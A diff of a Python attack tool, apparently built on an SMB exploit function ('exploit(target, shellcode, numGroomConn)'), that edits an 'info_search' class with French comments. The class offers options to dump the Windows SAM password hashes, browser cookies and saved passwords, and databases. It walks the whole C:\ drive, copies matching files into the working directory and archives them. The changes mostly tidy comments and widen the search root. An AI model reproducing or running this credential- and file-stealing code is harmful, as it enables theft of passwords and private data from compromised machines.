@@ -807,17 +807,8 @@ def exploit(target, shellcode, numGroomConn):
 #
 class info_search():
 
-	#Chemin ou sont stockes les fichiers dumpes
-	#path_docs = 'E:\Pytest'
-
-    	#Debut de larborescence que lon veut lister 
-  	 #Sous linux la racine est /
-    #Sous windows chaque partition a sa racine (exemple C:\)
-    #rootDir = 'C:\Users\%USERNAME%\Documents\Jesuistonpere' #C:\\
-
 	def __init__(self):
 		self.argParse()
-
 
     	def argParse(self):
 
@@ -832,8 +823,7 @@ class info_search():
         	options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
         	options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
         	options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
-
-		
+	
         	#On parse les arguments
         	args = parser.parse_args()
 
@@ -846,16 +836,10 @@ class info_search():
 		
 
     	def parse_all(self):
-
-        	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd()
-        	#Debut de larborescence que lon veut lister 
-        	#Sous linux la racine est /
-        	#Sous windows chaque partition a sa racine (exemple C:\)
-        	username = getpass.getuser()
-        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\ Poue windows7
-        	#rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
-        	rootDir = 'C:\\'
+		
+        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
+        	username = getpass.getuser() 
+        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
         
         	for dirName, subdirList, fileList in os.walk(rootDir):
 			#Ouverture du fichier "Directory_Tree.txt"
@@ -905,20 +889,12 @@ class info_search():
                     		#print("[ERROR] Split error")
                     		break
 
-
+				
 	def parse_with_char(self):
 
-        	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd()
-
-        	#Debut de larborescence que lon veut lister 
-        	#Sous linux la racine est /
-        	#Sous windows chaque partition a sa racine (exemple C:\)
-        	username = getpass.getuser()
-        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
-        	rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
-
-        	#rootDir = 'C:\\'
+        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
+        	username = getpass.getuser() 
+        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
 
         	char_choice = glob.glob(str(self.char))
         	for dirName, subdirList, fileList in os.walk(rootDir):
@@ -938,16 +914,9 @@ class info_search():
 
 	def parse_with_format(self):  
         
-        	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd()
-
-        	#Debut de larborescence que lon veut lister 
-        	#Sous linux la racine est /
-        	#Sous windows chaque partition a sa racine (exemple C:\)
+        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
         	username = getpass.getuser()
-        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
-        	rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
-        	#rootDir = 'C:\\'
+        	rootDir = 'C:\\' #Racine du chemin analysé pour la recherche
 
         	for dirName, subdirList, fileList in os.walk(rootDir):
             		#Ouverture du fichier "Directory_Tree.txt"
@@ -964,12 +933,10 @@ class info_search():
                     			shutil.copy2(dirName+'\\'+file, path_docs)
 
 
-
-
 	def dump_browser(self):
 
         	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd()
+        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
         	username = getpass.getuser()
 
 
@@ -1060,8 +1027,7 @@ class info_search():
 
 	def archivage(self):
 
-        	#Chemin ou sont stockes les fichiers dumpes
-        	path_docs = os.getcwd()
+        	path_docs = os.getcwd() #Récupération du chemin actuel ou sont stockes les fichiers dumpes
 
         	#Archivage
         	fic_all = os.listdir(path_docs)
